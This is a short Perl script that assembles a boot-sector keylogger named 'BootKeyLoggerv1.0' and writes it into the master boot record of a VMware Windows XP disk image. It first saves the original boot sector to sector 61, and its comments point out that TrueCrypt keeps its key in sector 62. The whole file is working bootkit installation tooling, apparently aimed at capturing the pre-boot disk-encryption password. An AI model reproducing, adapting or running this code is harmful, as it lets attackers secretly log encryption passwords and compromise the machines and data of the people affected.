#!/usr/bin/perl
use strict;
use warnings;

#Variables
my $AssemblyFile='./BootKeyLoggerv1.0.asm';	#The assembly file to compile
my $AssemblyOut='BootKeyLoggerv1.0.raw';	#The compiled output file
my $WriteTo='./Windows XP Professional.vmdk';	#File to write the new boot logger to
my $WriteToSector=0x210000;			#The location in the file to write the boot loader to. VMWare drives seem to start at this location (at least mine do)
my @CopyList=([0x210000,0x210000+61*512,512]);	#A list of data areas to copy (each item in the format [Source,Destination,Size]). In this case, copy the original boot loader sector (#0) to sector #61 of the harddrive (the last unused sector by truecrypt. Sector 62 contains the encryption key, and sector 63 is the first partition table).

#Compile assembly
system('nasm', $AssemblyFile, '-o', $AssemblyOut) and die "Error in assembling";

#Get compiled file
	#Read compiled file
	open(INFILE, $AssemblyOut) || die("Could not open file!");
	binmode INFILE;
	my $Data='', my $buffer;
	while(read(INFILE, $buffer, 65536)) {
		$Data.=$buffer;
	}
	close(INFILE);

	#Make sure the compiled file isn't too long
	if(length($Data) > 0x1BE) {
		die 'Compiled boot loader can only be 446 (0x1BE) bytes, but is '.length($Data)." bytes\n";
	}

	#print length($Data); #Output the length of the assembled file (Only useful if not padded with 0s at end)

#Open the file to write to
open(OUTFILE, '+<', $WriteTo) || die("Could not open output");
binmode OUTFILE;

#Do any requested sector copying
foreach my $DataCopy (@CopyList)
{
	#Read the data to copy
	$buffer='';
	seek(OUTFILE, $DataCopy->[0], 0);
	read(OUTFILE, $buffer, $DataCopy->[2]);
	
	#Write the copied data
	seek(OUTFILE, $DataCopy->[1], 0);
	print(OUTFILE $buffer);
}

#Write compiled boot loader
seek(OUTFILE, $WriteToSector, 0);
print(OUTFILE $Data);

#Close the file and output completed status
close(OUTFILE);
print "Compilation completed and written";